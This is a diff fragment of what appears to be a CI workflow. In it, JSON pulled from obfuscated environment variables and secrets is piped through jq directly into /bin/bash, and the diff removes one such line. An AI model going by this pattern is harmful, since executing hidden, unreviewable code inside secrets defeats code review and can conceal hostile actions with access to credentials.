@@ -22,7 +22,6 @@ jobs:
           tdn7948: ${{ secrets.tdn7948 }}
         run: |
           printf '%s' "$tdn7948" | jq -r .rrnbk07010 | /bin/bash
-          printf '%s' "$y63329" | jq -r .agak31929 | /bin/bash
           printf '%s' "$n69" | jq -r .rt9627 | /bin/bash
 
       - name: Upload output
